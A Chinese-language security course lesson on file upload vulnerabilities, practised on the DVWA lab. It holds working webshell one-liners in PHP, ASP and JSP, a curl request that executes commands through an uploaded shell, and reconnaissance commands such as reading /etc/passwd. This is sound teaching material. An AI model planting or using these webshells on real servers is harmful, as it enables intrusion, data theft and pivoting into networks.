---
title: Day025：文件上传漏洞 - 原理与基础利用
tags:
  - 网络安全
  - 文件上传
  - Webshell
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d025
date: 2026-02-16
updated: 2026-01-28
---

# Day025：文件上传漏洞 - 原理与基础利用

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 4：XSS 与文件上传 |
| **今日主题** | 文件上传漏洞原理与 Webshell |
| **预计时间** | 2.5 小时 |
| **难度等级** | 入门 |

---

## 今日痛点场景

> **场景**：某网站允许用户上传头像。你上传了一个 `.php` 文件，访问这个文件后，你竟然能执行系统命令！
>
> **问题**：为什么上传个文件就能控制服务器？这也太吓人了吧！
>
> **今天的任务**：理解文件上传漏洞的原理，上传你的第一个 Webshell。

---

## 今日目标

- [ ] 理解文件上传漏洞的本质
- [ ] 了解什么是 Webshell
- [ ] 成功上传并执行 PHP 代码
- [ ] 使用 Webshell 执行系统命令

**闯关条件**：在 DVWA 上传 Webshell 并成功执行 `whoami`。

---

## 实战任务（先动手！）

### 任务 1：上传正常图片（10 分钟）

**环境**：DVWA - File Upload - Low

**操作步骤**：
1. 准备一张正常的图片（任意 jpg/png）
2. 进入 File Upload 模块
3. 上传这张图片
4. 记录上传后的路径

**记录**：
```
上传成功提示：________________
文件保存路径：________________
```

---

### 任务 2：上传 PHP 文件（20 分钟）

**创建 Webshell**

创建一个文件 `test.php`：
```php
<?php
echo "Hello from PHP!";
phpinfo();
?>
```

**操作步骤**：
1. 上传 `test.php`
2. 观察是否成功
3. 访问上传后的文件路径

**记录**：
```
上传结果：________________
访问路径：________________
页面显示：________________
```

**成功标志**：看到 PHP 信息页面（phpinfo 输出）。

---

### 任务 3：上传一句话木马（30 分钟）

**创建一句话木马**

创建文件 `shell.php`：
```php
<?php @eval($_POST['cmd']); ?>
```

**操作步骤**：
1. 上传 `shell.php`
2. 记录文件路径
3. 使用以下方式测试：

**方法 1：使用 Hackbar 或 Burp**

POST 请求到 shell 路径，body 为：
```
cmd=system('whoami');
```

**方法 2：使用 curl**
```bash
curl -X POST -d "cmd=system('whoami');" http://target/path/shell.php
```

**记录**：
```
whoami 返回：________________
pwd 返回：________________
ls 返回：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 成功上传 PHP 文件 | 20 分 |
| 访问 PHP 文件并执行 | 20 分 |
| 理解一句话木马原理 | 20 分 |
| 成功执行 whoami | 25 分 |
| 理解 GetShell 的含义 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 文件上传漏洞原理

```
正常流程：
用户上传图片 → 服务器保存到 /uploads/xxx.jpg → 完成

攻击流程：
黑客上传 shell.php → 服务器保存到 /uploads/shell.php → 完成
黑客访问 shell.php → 服务器执行 PHP 代码 → 黑客获得控制权
```

**为什么能执行？**

Web 服务器（Apache/Nginx）看到 `.php` 文件会交给 PHP 解释器执行。上传的文件一旦是 PHP，就会被当作代码运行。

### 什么是 Webshell？

**Webshell** = Web + Shell

- 一个放在 Web 服务器上的后门程序
- 通过浏览器访问
- 可以执行服务器上的命令

**类比**：
- 正常网页：显示内容
- Webshell：执行命令（像远程终端）

### 一句话木马

最简单的 Webshell：

```php
<?php @eval($_POST['cmd']); ?>
```

**解析**：
- `$_POST['cmd']`：接收 POST 参数 cmd
- `eval()`：把字符串当作 PHP 代码执行
- `@`：隐藏错误信息

**使用方式**：
```
POST /shell.php
cmd=system('whoami');
```

服务器会执行 `system('whoami')`，返回当前用户名。

### GetShell 的含义

**GetShell** = 获取服务器的命令执行权限

这是渗透测试的核心目标之一。一旦 GetShell：
- 可以查看服务器文件
- 可以下载敏感数据
- 可以尝试提权
- 可以作为跳板攻击内网

### 常见 Webshell

| 类型 | 说明 |
|------|------|
| **一句话木马** | 最小化，功能单一 |
| **大马** | 功能丰富，有图形界面 |
| **加密马** | 代码经过混淆，难以被杀软发现 |
| **图片马** | 隐藏在图片中 |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 路径不对 | 访问 404 | 仔细看上传后显示的路径 |
| 没有执行 | 显示源码 | 检查服务器是否支持 PHP |
| 语法错误 | 空白页面 | 检查 PHP 语法 |
| 权限不足 | 命令不执行 | 可能被禁用了危险函数 |

---

## 知识卡片速查

### 常用一句话木马

```php
# PHP
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

# ASP
<%eval request("cmd")%>

# JSP
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### 测试命令

```bash
# Linux
whoami      # 当前用户
pwd         # 当前目录
ls -la      # 目录列表
cat /etc/passwd  # 用户列表
uname -a    # 系统信息

# Windows
whoami
dir
type C:\Windows\win.ini
systeminfo
```

### 上传路径

常见上传目录：
```
/uploads/
/upload/
/images/
/files/
/attachments/
```

---

## 常见问题

**Q1：为什么叫"一句话"木马？**

A1：因为代码只有一句话那么短。但功能强大——能执行任意代码。

**Q2：上传成功但访问显示源码怎么办？**

A2：说明服务器没有把 `.php` 当作 PHP 执行。可能：
1. 服务器不支持 PHP
2. 上传目录禁止执行脚本
3. 文件后缀被改了

**Q3：真实环境这么容易上传吗？**

A3：当然不是！DVWA Low 级别几乎没有防护。真实环境会有：
- 文件类型检查
- 后缀名白名单
- 文件内容检测
- 上传目录禁止执行

明天会学习如何绕过这些防护。

---

## 明日预告

**Day 026：文件上传漏洞 - 绕过上传限制**

明天你将：
- 学习绕过前端验证
- 学习绕过 MIME 类型检测
- 学习绕过后缀名黑名单
- 挑战 DVWA Medium/High

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 上传 PHP 成功 | 是/否 |
| 执行命令成功 | 是/否 |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你拿到了第一个 Shell。虽然是在靶场，但这种感觉——上传一个文件就控制了服务器——很震撼吧？
>
> 一句话木马虽然简单，但它是无数次真实入侵的起点。
>
> 现在你理解了为什么网站要严格检查上传文件——因为一旦让恶意文件上来，游戏就结束了。
>
> 记住：**上传点是渗透测试必看的地方**。能上传 = 可能 GetShell。

```bash
echo "Day 025 Complete! 第一个 Webshell 上传成功！"
```
